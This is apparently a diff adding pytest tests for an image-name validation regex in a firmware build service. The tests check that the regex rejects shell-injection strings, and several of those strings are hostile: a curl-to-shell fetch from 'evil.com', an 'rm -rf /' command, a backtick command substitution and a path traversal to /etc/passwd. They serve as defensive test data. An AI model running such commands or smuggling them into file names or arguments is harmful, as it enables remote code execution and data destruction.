@@ -2,6 +2,7 @@
 
 import pytest
 
+from asu.build import IMAGE_NAME_RE
 from asu.build_request import BuildRequest
 
 
@@ -134,3 +135,19 @@ def test_repo_url_accepts_http():
         repositories={"repo": "http://example.com/packages"},
     )
     assert req.repositories["repo"] == "http://example.com/packages"
+
+
+# --- Fix #3: Image name validation ---
+
+
+def test_image_name_regex_accepts_valid():
+    assert IMAGE_NAME_RE.match("openwrt-23.05.2-ath79-generic-sysupgrade.bin")
+    assert IMAGE_NAME_RE.match("firmware-v1.0+r12345.img")
+
+
+def test_image_name_regex_rejects_shell_injection():
+    assert not IMAGE_NAME_RE.match("$(curl evil.com|sh)")
+    assert not IMAGE_NAME_RE.match("file; rm -rf /")
+    assert not IMAGE_NAME_RE.match("`whoami`")
+    assert not IMAGE_NAME_RE.match("file name with spaces")
+    assert not IMAGE_NAME_RE.match("../../../etc/passwd")
